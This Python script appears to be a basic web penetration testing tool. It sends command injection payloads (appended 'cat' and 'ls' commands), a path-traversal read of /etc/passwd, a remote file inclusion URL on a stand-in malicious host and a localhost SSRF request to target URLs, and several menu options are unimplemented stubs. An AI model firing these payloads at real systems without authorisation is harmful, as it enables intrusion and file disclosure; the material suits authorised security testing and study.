######################################################################################################################################################################################################################
# Python script for possible vulnerabilities in a web application, and does not constitute or replace a robust vulnerability scanner. Note: Be mindful of the scope of work, & rules of engagement, script also requires BeautifulSoup Ref:https://beautiful-soup-4.readthedocs.io/en/latest/. .
# python web_security_framework.py. Requires a linux virtual environment for older python version funtionality, pip restrictions for external dependancies, and reducing conflicts. 
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
# without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
# to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
# portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE 
# AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
# Replace teaget_url with the specific endpoints you want to test for each vulnerability. Replace "http://your_base_url" with the base URL of the application you're testing
######################################################################################################################################################################################################################


import random
import string
from datetime import datetime
import os
import requests
from bs4 import BeautifulSoup
import threading
import matplotlib.pyplot as plt
import validators  # For URL validation

    
# Banner
def print_banner():
    banner = r"""
    
 __      __        ___.             _____                  .__   .__                  __  .__                       _________                           .__   __                ___________                                                  __                  _____  ______________  ___ ___    _____           _______  ____ 
/  \    /  \  ____ \_ |__          /  _  \ ______  ______  |  |  |__|  ____  _____  _/  |_|__| ____   ____         /   _____/ ____   ____   __ _________|__|_/  |_  ___.__.     \_   _____/____________     _____   ______  _  _____________|  | __             /  |  |/_   \______   \/   |   \  /  |  |          \   _  \/_   |
\   \/\/   /_/ __ \ | __ \        /  /_\  \\____ \ \____ \ |  |  |  |_/ ___\ \__  \ \   __\  |/  _ \ /    \        \_____  \_/ __ \_/ ___\ |  |  \_  __ \  |\   __\<   |  |      |    __)  \_  __ \__  \   /     \_/ __ \ \/ \/ /  _ \_  __ \  |/ /   ______   /   |  |_|   ||     ___/    ~    \/   |  |_  ______ /  /_\  \|   |
 \        / \  ___/ | \_\ \      /    |    \  |_> >|  |_> >|  |__|  |\  \___  / __ \_|  | |  (  <_> )   |  \       /        \  ___/\  \___ |  |  /|  | \/  | |  |   \___  |      |     \    |  | \// __ \_|  Y Y  \  ___/\     (  <_> )  | \/    <   /_____/  /    ^   /|   ||    |   \    Y    /    ^   / /_____/ \  \_/   \   |
  \__/\  /   \___  >|___  /______\____|__  /   __/ |   __/ |____/|__| \___  >(____  /|__| |__|\____/|___|  /______/_______  /\___  >\___  >|____/ |__|  |__| |__|   / ____|______\___  /    |__|  (____  /|__|_|  /\___  >\/\_/ \____/|__|  |__|_ \           \____   | |___||____|    \___|_  /\____   |           \_____  /___|
       \/        \/     \//_____/        \/|__|    |__|                   \/      \/                     \//_____/        \/     \/     \/                          \/    /_____/    \/                \/       \/     \/                        \/                |__|                      \/      |__|                 \/     

                                                     _:_
                                                    '-.-'
                                           ()      __.'.__
                                        .-:--:-.  |_______|
                                 ()      \____/    \=====/
                                 /\      {====}     )___(
                      (\=,      //\\      )__(     /_____\
      __    |'-'-'|  //  .\    (    )    /____\     |   |
     /  \   |_____| (( \_  \    )__(      |  |      |   |
     \__/    |===|   ))  \_)   /____\     |  |      |   |
    /____\   |   |  (/     \    |  |      |  |      |   |
     |  |    |   |   | _.-'|    |  |      |  |      |   |
     |__|    )___(    )___(    /____\    /____\    /_____\
    (====)  (=====)  (=====)  (======)  (======)  (=======)
    }===={  }====={  }====={  }======{  }======{  }======={
   (______)(_______)(_______)(________)(________)(_________)

    """
    print(banner)

# Function to log test results to a file
def log_result(test_name, result, details=""):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"{timestamp} - {test_name}: {result}\nDetails: {details}\n"
    
    with open("penetration_testing_report.txt", "a") as log_file:
        log_file.write(log_entry)

# Function to log test results to an HTML report
def log_result_html(test_name, result, details=""):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    report_entry = f"""
    <tr>
        <td>{timestamp}</td>
        <td>{test_name}</td>
        <td>{result}</td>
        <td>{details}</td>
    </tr>
    """
    if not os.path.exists("penetration_testing_report.html"):
        with open("penetration_testing_report.html", "w") as html_file:
            html_file.write("""
            <html>
                <head><title>Penetration Testing Report</title></head>
                <body>
                    <h1>Penetration Testing Report</h1>
                    <table border="1">
                        <tr><th>Timestamp</th><th>Test</th><th>Result</th><th>Details</th></tr>
            """)

    with open("penetration_testing_report.html", "a") as html_file:
        html_file.write(report_entry)

# --- New Vulnerability Tests ---
# Adaptive Payload Function
def adapt_payload(test_name, server_info):
    # Dynamically craft payload based on server details
    if "nginx" in server_info:
        return {"input": "; cat /etc/nginx/nginx.conf"}
    elif "apache" in server_info:
        return {"input": "; cat /etc/httpd/conf/httpd.conf"}
    return {"input": "; ls"}  # Default payload

# SSRF Test (Server-Side Request Forgery)
def ssrf_test(url):
    print(f"Testing for SSRF on: {url}")
    payload = {"url": "http://127.0.0.1:80"}  # Targeting localhost
    try:
        response = requests.post(url, data=payload)
        if "refused" not in response.text:
            log_result("SSRF Test", "Vulnerable", f"SSRF vulnerability detected on {url}. Response: {response.text}")
        else:
            log_result("SSRF Test", "Not Vulnerable", f"No SSRF vulnerability detected on {url}.")
    except requests.exceptions.RequestException as e:
        log_result("SSRF Test", "Error", f"Error during SSRF test on {url}: {str(e)}")

# Command Injection Test
def command_injection_test(url):
    print(f"Testing for Command Injection on: {url}")
    server_info = requests.head(url).headers.get("Server", "")
    payload = adapt_payload("Command Injection", server_info)
    try:
        response = requests.post(url, data=payload)
        if "bin" in response.text or "root" in response.text:
            log_result("Command Injection Test", "Vulnerable", f"Command Injection vulnerability detected on {url}. Response: {response.text}")
        else:
            log_result("Command Injection Test", "Not Vulnerable", f"No Command Injection vulnerability detected on {url}.")
    except requests.exceptions.RequestException as e:
        log_result("Command Injection Test", "Error", f"Error during Command Injection test on {url}: {str(e)}")

# LFI/RFI Test
def lfi_rfi_test(url):
    print(f"Testing for LFI/RFI on: {url}")
    lfi_payload = {"file": "../../../../etc/passwd"}  # Common LFI payload
    rfi_payload = {"file": "http://malicious-website.com/malicious.php"}  # Common RFI payload

    # LFI Test
    try:
        lfi_response = requests.get(url, params=lfi_payload)
        if "root:" in lfi_response.text:
            log_result("LFI Test", "Vulnerable", f"LFI vulnerability detected on {url}. Response: {lfi_response.text}")
        else:
            log_result("LFI Test", "Not Vulnerable", f"No LFI vulnerability detected on {url}.")
    except requests.exceptions.RequestException as e:
        log_result("LFI Test", "Error", f"Error during LFI test on {url}: {str(e)}")

    # RFI Test
    try:
        rfi_response = requests.get(url, params=rfi_payload)
        if "malicious" in rfi_response.text:
            log_result("RFI Test", "Vulnerable", f"RFI vulnerability detected on {url}. Response: {rfi_response.text}")
        else:
            log_result("RFI Test", "Not Vulnerable", f"No RFI vulnerability detected on {url}.")
    except requests.exceptions.RequestException as e:
        log_result("RFI Test", "Error", f"Error during RFI test on {url}: {str(e)}")

# Automation: Crawl website and extract forms
def crawl_website(url):
    print(f"Crawling website: {url}")
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
        for form in forms:
            log_result("Form Found", "Info", str(form))
    except requests.exceptions.RequestException as e:
        log_result("Crawl Website", "Error", f"Error crawling website {url}: {str(e)}")

# Parallel Execution
def run_test_in_parallel(test_func, urls):
    threads = []
    for url in urls:
        thread = threading.Thread(target=test_func, args=(url,))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

# Advanced Logging with Visualisation
def generate_report_chart():
    labels = ['Vulnerable', 'Not Vulnerable']
    counts = [0, 0]  # Replace with actual counts from logs

    # Count occurrences from the text log
    with open("penetration_testing_report.txt", "r") as log_file:
        logs = log_file.readlines()
        counts[0] = sum(1 for log in logs if "Vulnerable" in log)
        counts[1] = sum(1 for log in logs if "Not Vulnerable" in log)

    plt.bar(labels, counts, color=['red', 'green'])
    plt.title("Vulnerability Test Results")
    plt.ylabel("Count")
    plt.savefig("vulnerability_report_chart.png")

# Security Safeguards
def validate_user_authorisation():
    authorised = input("Are you authorised to test this system? (yes/no): ").strip().lower()
    if authorised != "yes":
        print("You are not authorised to perform these tests.")
        exit()

# URL Validation
def is_valid_url(url):
    if not validators.url(url):
        print(f"Invalid URL: {url}")
        return False
    return True

# --- Menu System ---
def print_main_menu():
    options = [
        "[1] Crawl Website and Extract Forms", "[2] Brute Force Test (Optional)", 
        "[3] RCE Test", "[4] LDAP Injection Test", "[5] Path Traversal Test", 
        "[6] SQL Injection Test", "[7] SSRF Test", "[8] Command Injection Test", 
        "[9] LFI/RFI Test", "[10] Exit"
    ]
    
    # Display options in a column-like structure
    print("=" * 30)
    print("Advanced Web Penetration Testing Framework")
    print("=" * 30)
    for i in range(0, len(options), 2):
        print(f"{options[i]:<40} {options[i+1] if i+1 < len(options) else ''}")
    print("=" * 30)

# Function to get user input for form selection
def get_user_input():
    try:
        return int(input("Enter your choice (1 - 10): ").strip())
    except ValueError:
        print("Invalid choice. Please enter a number between 1 and 10.")
        return None

# Main Script
def main():
    print_banner()
    validate_user_authorisation()

    while True:
        print_main_menu()
        choice = get_user_input()

        if choice == 1:
            url = input("Enter the URL to crawl: ").strip()
            if is_valid_url(url):
                crawl_website(url)
        elif choice == 2:
            print("Brute Force Test option selected. Implement logic here.")
        elif choice == 3:
            print("RCE Test option selected. Implement logic here.")
        elif choice == 4:
            print("LDAP Injection Test option selected. Implement logic here.")
        elif choice == 5:
            print("Path Traversal Test option selected. Implement logic here.")
        elif choice == 6:
            print("SQL Injection Test option selected. Implement logic here.")
        elif choice == 7:
            url = input("Enter the URL to test for SSRF: ").strip()
            if is_valid_url(url):
                ssrf_test(url)
        elif choice == 8:
            url = input("Enter the URL to test for Command Injection: ").strip()
            if is_valid_url(url):
                command_injection_test(url)
        elif choice == 9:
            url = input("Enter the URL to test for LFI/RFI: ").strip()
            if is_valid_url(url):
                lfi_rfi_test(url)
        elif choice == 10:
            print("Exiting...")
            break
        else:
            print("Invalid option. Please try again.")

if __name__ == "__main__":
    main()
